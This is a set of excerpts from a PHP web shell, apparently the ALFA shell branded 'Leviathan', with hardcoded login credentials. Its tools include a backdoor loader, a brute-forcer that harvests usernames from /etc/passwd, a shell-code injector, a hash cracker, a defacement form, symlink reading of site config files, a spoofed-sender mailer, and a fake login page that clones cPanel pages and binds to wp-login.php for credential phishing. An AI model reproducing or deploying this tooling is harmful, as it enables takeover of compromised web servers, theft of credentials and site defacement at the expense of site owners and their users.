...
$GLOBALS['Leviathan'] = array(
    'username' => 'DoS',
   	'password' => '0196f6c4f97df3f48d570c23e46501ae',//md5(ehsan)
    'safe_mode' => '0',
    'login_page' => '403',
    'show_icons' => '1',
...
<center><table>
<tr><td><font color="white" face="DejaVu Sans" size=-1>Login:</font></td><td><input type="text" size="30" name="usrname" DoS=" " onfocus="if (this.value == \'username\'){this.value = \'\';}"></td></tr>
<tr><td><font color="white" face="DejaVu Sans" size=-1>Password:</font></td><td><input type="password" size="30" name="password" DoS=" " onfocus="if (this.value == \'password\') this.value = \'\';"></td></tr>
...
'td5' =>
array('color' => 'FFFFFF', 'tdName' => 'Backdoor Loader: ', 'inputName' => 'file', 'inputValue' => $cwd, 'inputSize' => '50', 'DoS' => true),
'td6' =>
...
function alfawhois(){
echo("<div class='header'><center><p><div class='txtfont_header'>| Whois |</div></p><p><form onsubmit=\"g('whois',null,this.url.value,'>>');return false;\"><div class='txtfont'>Url: </div> <input type='text' name='url' style='text-align:center;' size='50' DoS='google.com'> <input type='submit' value=' '></form></p></center>");
...
echo '';
echo '<table border="1"><tbody><tr><td><div class="tbltxt" style="color:#FFFFFF">Protect:</div></td><td><select name="protect" style="width:100%;">'.$protect_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Cgi Api:</div></td><td><select name="cgi_api" style="width:100%;">'.$cgiapi_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Post Encryption:</div></td><td><select name="post_encrypt" style="width:100%;">'.$postEnc_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Show Icons:</div></td><td><select name="icon" style="width:100%;">'.$icon_html.'</select></td></tr><tr><tr><td><div class="tbltxt" style="color:#FFFFFF">login Page:</div></td><td><select style="width:100%;" name="lgpage">'.$login_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">UserName:</div></td><td><input type="text" style="width:95%;" name="username" value="'.(empty($_POST['alfa3'])?$GLOBALS['DB_NAME']['user']:$_POST['alfa3']).'" DoS="solevisible"></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Password:</div></td><td><input type="text" style="width:95%;" name="password" DoS="*****"></td></tr></tbody></table><input type="hidden" name="e" value="'.$GLOBALS['DB_NAME']['safemode'].'"><input type="hidden" name="s" value="'.$GLOBALS['DB_NAME']['show_icons'].'"><p><input type="submit" name="btn" value=" "></p></form></center>';
if($_POST['alfa5']=='>>'){
echo __pre();
...
if($db){
	...
	echo("<div style='text-align:center;'><span>Output Type: </span><select id='dumper-delimiter-type' onchange='colDumplerSelectType(this);' name='output_type'><option value='delimiter' selected>delimiter</option><option value='json'>json</option></select><div id='coldumper-delimiter-input' style='display:inline;'><span> Delimiter: </span><input id='dumper-delimiter-input' style='text-align:center;' type='text' name='delimiter' DoS='eg: ,'></div></div>");
	$data = array();
...
<textarea DoS="Users" rows="20" cols="25" name="usernames">'.($GLOBALS['sys']=='unix'?alfaEx("cut -d: -f1 /etc/passwd"):"").'</textarea>
&nbsp <textarea DoS="Passwords" rows="20" cols="25" name="passwords"></textarea><br><br>
...
<p><div class='txtfont'>Target:</div> <input type='text' size=30 name='url' style='text-align:center;' DoS=\"target.com\"> <input type='submit' name='go' value=' ' /></p></form></center>";
...
echo "<tr><td><div class='tbltxt'>".$array['tdName']."</div></td><td><input type='text' id='".$array['id']."' name='".$array['inputName']."' ".($array['DoS']?'DoS':'value')."='".$array['inputValue']."' size='".$array['inputSize']."' ".($array['disabled']?'disabled':'')."></td></tr>";
}
echo '</table>';
}
...
<p><br><textarea rows='12' cols='70' type='text' name='code' DoS=\"insert your shell code\"></textarea><br/><br/>
...
echo'</select><input type="text" DoS="Hash" name="md5" size="60" id="text" /> <input type="submit" value=" " name="go" /></form></center><br>';
if($_POST['alfa3'] == '>>'){
$hash = $_POST['alfa2'];
if(!empty($hash)){
...
<div class="txtfont">Hash: </div> <input type="text" DoS="Hash" name="hash" size="60" id="text" /> <input type="submit" value=" " name="go" /></form></center><br>';
if($_POST['alfa3'] == '>>'){
$hash = $_POST['alfa2'];
if(!empty($hash)){
$curl = new AlfaCURL();
...
echo '
<form onsubmit="g(\'safe\',null,null,null,null,null,null,\'valiases\',this.site.value,null,\'>>\'); return false;" method="post" /><center><div class="txtfont">Url: </font><input type="text" DoS="site.com" name="site" /> <input type="submit" value=" " name="go" /></form></center>';
...
<input type="text" name="defacer" size="67" id="text" DoS="LPH TEAM 2023" />
<br>
...
echo '</select><br>
<textarea name="domain" cols="90" rows="20" DoS="Domains..."></textarea><br>
...
<input type="text" name="file" DoS="Example : /home/user/public_html/config.php" size="60"/><br />
<input type="text" name="symfile" DoS="Example : alfa.txt" size="60"/>
...
foreach ($database_list as $db_name) {
	...
	if($db_name == $_POST['sql_base']){
		...
		echo '<ul><li><div class="block"><i></i><b></b></div><div><input style="padding: 0;margin-left: 11px;text-align:center;" type="text" class="db-opt-id" target=".cls-'.$db_name.'" DoS="Filter Table" onkeyup="alfaMysqlFilterTable(this);" name="filter"></div></li>';
...
$table = array(
'td1' => array('color' => 'FFFFFF', 'tdName' => 'Mail To : ', 'inputName' => 'mail_to', 'inputValue' => 'target@fbi.gov', 'inputSize' => '60','DoS' => true),
'td2' => array('color' => 'FFFFFF', 'tdName' => 'From : ', 'inputName' => 'mail_from', 'inputValue' => 'sec@google.com', 'inputSize' => '60', 'DoS' => true),
...
echo("</select>");
echo ' Path installed cms: <input size="50" type="text" name="cmspath" DoS="ex: /home/user/public_html/vbulletin/">
...
function alfafakepage(){
	...
	foreach($cm_array as $key=>$val)echo '<option value="'.$key.'">'.$val.'</option>';
	echo("</select></div>");
	echo '<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Clone page: </span><input size="50" type="text" name="clone_page" DoS="eg: https://target.com:2083 | https://target.com:2222"></div>
	...
	<div style="margin-bottom:6px;"><span style="display: inline-block;width: 106px;">Bind on: </span><input size="50" type="text" name="bind_on" DoS="eg: '.$_SERVER["DOCUMENT_ROOT"].'/wp-login.php"></div>
